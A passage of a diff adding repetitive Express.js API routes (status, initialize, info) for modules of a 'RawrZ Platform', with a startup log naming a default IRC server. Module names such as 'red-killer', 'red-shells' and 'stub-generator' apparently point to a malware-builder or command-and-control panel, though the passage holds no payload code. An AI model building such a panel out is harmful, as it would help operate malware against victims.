+    try {
+        const result = await realModules.backupSystem.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/backup-system/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'backupSystem',
+            status: 'active',
+            endpoints: [
+                '/api/backup-system/status',
+                '/api/backup-system/initialize',
+                '/api/backup-system/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// dualGenerators comprehensive API endpoints
+app.get('/api/dual-generators/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.dualGenerators.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/dual-generators/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.dualGenerators.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/dual-generators/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'dualGenerators',
+            status: 'active',
+            endpoints: [
+                '/api/dual-generators/status',
+                '/api/dual-generators/initialize',
+                '/api/dual-generators/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// fullAssembly comprehensive API endpoints
+app.get('/api/full-assembly/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.fullAssembly.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/full-assembly/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.fullAssembly.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/full-assembly/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'fullAssembly',
+            status: 'active',
+            endpoints: [
+                '/api/full-assembly/status',
+                '/api/full-assembly/initialize',
+                '/api/full-assembly/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// mobileTools comprehensive API endpoints
+app.get('/api/mobile-tools/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mobileTools.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/mobile-tools/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.mobileTools.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/mobile-tools/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'mobileTools',
+            status: 'active',
+            endpoints: [
+                '/api/mobile-tools/status',
+                '/api/mobile-tools/initialize',
+                '/api/mobile-tools/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// nativeCompiler comprehensive API endpoints
+app.get('/api/native-compiler/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.nativeCompiler.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/native-compiler/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.nativeCompiler.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/native-compiler/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'nativeCompiler',
+            status: 'active',
+            endpoints: [
+                '/api/native-compiler/status',
+                '/api/native-compiler/initialize',
+                '/api/native-compiler/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// pluginArchitecture comprehensive API endpoints
+app.get('/api/plugin-architecture/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.pluginArchitecture.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/plugin-architecture/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.pluginArchitecture.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/plugin-architecture/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'pluginArchitecture',
+            status: 'active',
+            endpoints: [
+                '/api/plugin-architecture/status',
+                '/api/plugin-architecture/initialize',
+                '/api/plugin-architecture/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// templateGenerator comprehensive API endpoints
+app.get('/api/template-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.templateGenerator.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/template-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.templateGenerator.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/template-generator/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'templateGenerator',
+            status: 'active',
+            endpoints: [
+                '/api/template-generator/status',
+                '/api/template-generator/initialize',
+                '/api/template-generator/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// redKiller comprehensive API endpoints
+app.get('/api/red-killer/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redKiller.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/red-killer/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redKiller.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/red-killer/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'redKiller',
+            status: 'active',
+            endpoints: [
+                '/api/red-killer/status',
+                '/api/red-killer/initialize',
+                '/api/red-killer/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// redShells comprehensive API endpoints
+app.get('/api/red-shells/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redShells.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/red-shells/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.redShells.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/red-shells/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'redShells',
+            status: 'active',
+            endpoints: [
+                '/api/red-shells/status',
+                '/api/red-shells/initialize',
+                '/api/red-shells/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// reverseEngineering comprehensive API endpoints
+app.get('/api/reverse-engineering/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.reverseEngineering.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/reverse-engineering/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.reverseEngineering.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/reverse-engineering/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'reverseEngineering',
+            status: 'active',
+            endpoints: [
+                '/api/reverse-engineering/status',
+                '/api/reverse-engineering/initialize',
+                '/api/reverse-engineering/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// stubGenerator comprehensive API endpoints
+app.get('/api/stub-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.stubGenerator.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/stub-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.stubGenerator.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/stub-generator/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'stubGenerator',
+            status: 'active',
+            endpoints: [
+                '/api/stub-generator/status',
+                '/api/stub-generator/initialize',
+                '/api/stub-generator/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+// advancedStubGenerator comprehensive API endpoints
+app.get('/api/advanced-stub-generator/status', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedStubGenerator.getStatus();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.post('/api/advanced-stub-generator/initialize', requireAuth, async (req, res) => {
+    try {
+        const result = await realModules.advancedStubGenerator.initialize();
+        res.json({ success: true, result, timestamp: new Date().toISOString() });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+
+app.get('/api/advanced-stub-generator/info', requireAuth, async (req, res) => {
+    try {
+        const result = {
+            name: 'advancedStubGenerator',
+            status: 'active',
+            endpoints: [
+                '/api/advanced-stub-generator/status',
+                '/api/advanced-stub-generator/initialize',
+                '/api/advanced-stub-generator/info'
+            ],
+            timestamp: new Date().toISOString()
+        };
+        res.json({ success: true, result });
+    } catch (e) {
+        res.status(500).json({ error: e.message, timestamp: new Date().toISOString() });
+    }
+});
+app.listen(port, () => {
+    console.log(`[OK] RawrZ Platform server running on port ${port}`);
+    console.log(`[INFO] Available engines: ${Object.keys(realModules).length}`);
+    console.log(`[INFO] Health check: http://localhost:${port}/health`);
+    console.log(`[INFO] Configuration: http://localhost:${port}/api/config`);
+    console.log(`[INFO] Available engines: http://localhost:${port}/api/engines/available`);
+    console.log(`[INFO] Server URL: ${config.server.baseUrl}`);
+    console.log(`[INFO] Default IRC Server: ${config.server.defaultIrcServer}`);
+});
+
+module.exports = { app, realModules };
